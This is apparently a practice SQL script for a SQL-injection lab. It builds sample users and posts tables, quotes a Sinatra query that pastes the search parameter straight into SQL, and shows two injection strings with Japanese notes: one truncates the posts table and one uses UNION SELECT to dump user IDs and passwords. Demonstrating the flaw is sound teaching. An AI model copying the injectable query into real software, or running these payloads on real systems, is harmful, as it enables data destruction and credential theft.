create database sql_injection;

create table users(
  id serial not null primary key,
  userid varchar(15),
  password varchar(15),
  name varchar(20),
  tel varchar(15),
  address varchar(50),
  email varchar(30),
  birthday date
  );

  create table posts(
    id serial not null primary key,
    title varchar,
    content varchar,
    date date
  );

insert into users values
('1','tanaka','tatata','田中太郎','080-0000-0000','東京都新宿区OXOX','tanaka@mail.com','1988-10-13'),
('2','satoh','sat234','佐藤一朗','090-1234-5656','大阪府大阪市OOO-XX','ichiro@mail.net','1993-9-27'),
('3','oshiro','sonylove2','大城花子','070-4567-3000','沖縄県宜野湾市XX-XX-OO','hanahana@mail.com','1995-2-28'),
('4','saten','railgun333','佐天瑠衣子','092-888-5050','福岡県福岡市OOOO-XX-X','ruichan@mail.org','2000-4-5'),
('5','jonathan','usausa777','ジョナサン・リチャーズ','000-0000-0000','沖縄県嘉手納町O-XX-OO','jonathan@mail.co.uk','1975-7-30'),
('6','hacker','hacker','hacker','secret','secret','secret','0001-1-1');

insert into posts(title,content,date) values
('test','test投稿です','2018-10-3'),
('sinatra','sinatra楽しいー','2018-11-15'),
('rails','ruby on rails ってべんりだよね','2018-11-28'),
('html入門','勉強始めたばかりです。タグが多くて覚えられない^^;','2018-12-31'),
('今日のご飯','大好物のタコライスだヽ(｀▽´)/','2019-1-5'),
('フロントエンド','フロントエンドのvue.js,nuxt.js勉強始めました','2019-2-19'),
('okinawa','めんそーれ！！','2019-3-31'),
('アメリカ','久々に帰りたいな','2019-5-8'),
('activerecord','バリデーション設定や紐付けがかんたんにできて便利！','2019-8-24'),
('bcrypt','パスワードを暗号化して保存するgem','2019-10-10');

app.rbのSQL文
select title, content, date from posts where title like '%#{params[:search]}%' or content like '%#{params[:search]}%'

テーブルのデータをすべて削除する
'; truncate table posts; --' これを検索フォームに入力すると

select title, content, date from posts where title like '%'; truncate table posts; --%' or content like '%#{params[:search]}%'

ユーザーIDとパスワードを表示する
' union select userid, password, current_date from users; --' これを検索フォームに入力すると

select title, content, date from posts where title like '%' union select userid, password, current_date from users; --%' or content like '%#{params[:search]}%'